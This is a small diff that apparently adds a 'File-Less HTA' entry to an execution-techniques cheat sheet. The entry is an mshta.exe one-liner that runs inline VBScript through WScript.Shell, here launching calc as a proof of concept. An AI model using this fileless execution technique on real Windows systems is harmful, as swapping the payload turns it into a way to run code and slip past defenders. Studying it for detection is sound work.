@@ -228,3 +228,5 @@ public class Program
 </body>
 </html>
 ```
+### File-Less HTA
+`mshta.exe javascript:"<script language=vbscript>createobject(\"WScript.Shell\").run(\"calc\")\r\nclose()</script>"`   
